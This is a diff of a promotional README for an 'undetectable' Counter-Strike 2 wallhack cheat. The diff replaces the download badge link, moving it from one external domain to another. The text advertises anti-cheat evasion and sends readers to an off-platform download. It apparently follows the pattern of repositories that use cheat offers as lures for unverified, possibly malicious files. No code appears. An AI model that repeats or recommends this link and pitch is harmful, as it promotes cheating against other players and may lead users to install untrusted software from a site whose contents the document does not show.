@@ -7,7 +7,7 @@ Dominate every round in **Counter-Strike 2** with this clean and undetectable **
 - 🎮 **Smooth Performance, No FPS Loss**  
 - ⚙️ **Customizable Visuals & Colors**
 
-[![Download CS2 WallHack](https://img.shields.io/badge/Download-CS2%20WallHack-blueviolet)](https://resser.tech)
+[![Download CS2 WallHack](https://img.shields.io/badge/Download-CS2%20WallHack-blueviolet)](https://2xethevent.com)
 
 Outsmart your enemies and take control of the game. 🧠💣
 
